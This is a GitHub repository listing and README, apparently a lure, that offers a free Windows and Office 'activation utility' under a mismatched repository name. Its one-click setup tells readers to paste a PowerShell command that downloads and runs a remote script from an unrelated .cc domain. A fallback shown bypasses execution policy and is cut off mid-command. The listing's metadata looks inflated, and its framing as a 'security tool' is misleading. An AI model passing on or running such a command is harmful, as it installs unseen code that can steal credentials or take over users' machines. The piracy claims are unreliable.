---
repo: "rajay782/windows-suite-migration-auditor"
name: "windows-suite-migration-auditor"
description: "Windows 10/11 and Office 365 2019 setup tool development repository"
readmeQualityOk: true
url: "https://github.com/rajay782/windows-suite-migration-auditor"
language: "Go"
languages: ["Go"]
languagePcts: [100]
topics: ["activator", "freeactivaton", "office365", "windows-10"]
stars: 82
forks: 0
openIssues: 0
closedIssues: 0
watchers: 0
contributors: 1
recentReleases: 0
createdAt: "2026-10-29T17:03:09Z"
lastCommitAt: "2026-10-31T19:01:52Z"
status: "thriving"
tags: []
healthScore: 80
undervaluedScore: 17
maintainers: ["github-actions[bot]", "rajay782"]
openGraphImageUrl: "https://opengraph.githubassets.com/96b0d00dbaf9d808cdc0f4498b004f0b5445e49ecad7be76002ee73752bca51e/rajay782/windows-suite-migration-auditor"
---

# Microsoft 360 2019 Activation Utility — Security Tool

---

This repository contains a Windows 10/11 and Office 365/2019 activation utility distributed as a text-based command script. The tool operates by writing a predefined command sequence to a `.cmd` file, which is then executed to apply the activation routine on the target host. Intended for development and testing environments, the project documents the activation workflow and the underlying command structure in a reproducible form. Users are responsible for ensuring they hold valid licenses before applying any activation method described here.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **One-line setup** — just run the command below.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Paste and run
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If PowerShell blocks the script
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm…
